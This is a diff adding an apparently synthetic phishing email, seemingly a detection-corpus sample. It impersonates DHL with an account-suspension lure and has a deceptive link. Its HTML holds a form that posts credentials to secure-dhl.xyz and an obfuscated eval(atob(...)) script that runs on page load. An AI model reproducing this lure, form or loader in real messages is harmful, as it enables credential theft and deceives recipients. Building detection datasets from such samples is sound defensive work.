@@ -1,0 +1,30 @@
+From: notice@secure-dhl.xyz
+To: victim50@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 26 Mar 2002 20:06:00 -0500
+Message-ID: <phish-50-598123dc-c73e-409c-87ae-88eab1123945@secure-dhl.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 04 Mar 2002 12:35:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 23 Mar 2002 06:11:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 07 Mar 2002 01:03:00 -0500
+Return-Path: <bounce@mail-8244a2bd.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-8244a2bd.top; dkim=fail header.d=secure-dhl.xyz; dmarc=fail header.from=secure-dhl.xyz
+Received-SPF: fail (mx.example.com: domain of notice@secure-dhl.xyz does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-dhl.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-50-a8f7ef03"
+
+--bnd-p-50-a8f7ef03
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://secure-dhl.xyz/login
+
+Reference: PD5C492
+--bnd-p-50-a8f7ef03
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://secure-dhl.xyz/login<br/><br/>Reference: PD5C492</p><p><a href="http://secure-dhl.xyz/login">https://www.dhl.com/signin</a></p><form action="http://secure-dhl.xyz/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-50-a8f7ef03--
